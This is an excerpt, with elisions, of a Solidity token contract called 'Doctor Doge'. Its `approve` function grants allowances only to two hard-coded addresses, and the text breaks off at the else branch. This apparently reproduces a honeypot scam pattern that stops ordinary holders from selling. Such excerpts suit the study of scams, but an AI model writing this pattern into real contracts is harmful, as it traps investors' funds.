...
contract DoctorDoge {
    ...
    string public name = "Doctor Doge";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xe092BE22E753F7409dEAB4EAE4D74F7f3f2C36f5)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x9A8f3E2c0c0BFC152636FcFb8753C0A48C4075EB)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
